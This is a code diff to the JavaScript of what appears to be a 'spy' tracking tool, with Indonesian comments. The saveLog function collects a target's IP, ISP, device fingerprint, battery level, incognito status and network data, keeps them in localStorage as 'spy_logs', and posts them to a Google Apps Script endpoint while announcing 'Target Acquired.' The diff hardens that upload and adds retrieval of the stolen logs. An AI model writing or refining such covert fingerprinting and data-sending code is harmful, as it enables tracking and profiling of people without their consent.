@@ -145,7 +145,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
     async function saveLog(data, type = 'Manual', targetUrl = 'Manual Search') {
         const cloudUrl = getCUrl();
-        
+
         // Ambil semua intelijen perangkat secara asinkron
         const [device, battery, incognito] = await Promise.all([
             getDeviceInfo(),
@@ -154,8 +154,9 @@ document.addEventListener('DOMContentLoaded', function () {
         ]);
         const network = getNetworkInfo();
 
-        // Payload sinkron 1:1 dengan rowData di Google Apps Script (Kolom B-T)
+        // Payload untuk dikirim ke Google Apps Script
         const logEntry = {
+            timestamp: new Date().toISOString(),
             type: type,
             ip: data.ip || 'Unknown',
             isp: data.isp || 'Unknown',
@@ -183,26 +184,32 @@ document.addEventListener('DOMContentLoaded', function () {
             return;
         }
 
-        // Save Local
+        // Save Local backup
         const localLogs = JSON.parse(localStorage.getItem('spy_logs') || '[]');
         localLogs.unshift({ ...logEntry, timestamp: new Date().toLocaleString('id-ID') });
         localStorage.setItem('spy_logs', JSON.stringify(localLogs.slice(0, 50)));
 
-        if (cloudUrl) {
-            try {
-                // Gunakan mode no-cors untuk bypass kebijakan CORS Google Script
-                fetch(cloudUrl, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    keepalive: true,
-                    headers: { 'Content-Type': 'text/plain' },
-                    body: JSON.stringify(logEntry)
-                });
-                console.log("Tracking sync initiated.");
-                speak("Target Acquired. Data synchronized to cloud.");
-                // Beri jeda singkat untuk memastikan buffer stream terkirim
-                await new Promise(r => setTimeout(r, 800));
-            } catch (e) { console.error("Cloud Error", e); }
+        try {
+            const response = await fetch(`${cloudUrl}?action=save`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'text/plain' },
+                body: JSON.stringify(logEntry),
+                mode: 'cors'
+            });
+
+            if (!response.ok) {
+                throw new Error(`Cloud sync gagal: ${response.status}`);
+            }
+
+            const result = await response.json();
+            if (!result.success) {
+                throw new Error(result.error || 'Unknown cloud error');
+            }
+
+            console.log('Tracking sync completed.', result.message);
+            speak('Target Acquired. Data synchronized to cloud.');
+        } catch (e) {
+            console.error('Cloud Error', e);
         }
     }
 
@@ -210,10 +217,15 @@ document.addEventListener('DOMContentLoaded', function () {
         const cloudUrl = getCUrl();
         logsBody.innerHTML = '<tr><td colspan="6" class="text-center py-4"><div class="spinner-border spinner-border-sm text-primary"></div> Menghubungkan ke Satelit...</td></tr>';
         try {
-            const res = await fetch(cloudUrl);
+            const res = await fetch(`${cloudUrl}?action=logs`, { mode: 'cors' });
             const data = await res.json();
-            renderLogs(data);
+            if (data.success && Array.isArray(data.logs)) {
+                renderLogs(data.logs);
+                return;
+            }
+            throw new Error('Response log tidak valid');
         } catch (e) {
+            console.warn('Cloud log fetch gagal, menampilkan cache lokal.', e);
             renderLogs(JSON.parse(localStorage.getItem('spy_logs') || '[]'), true);
         }
     }
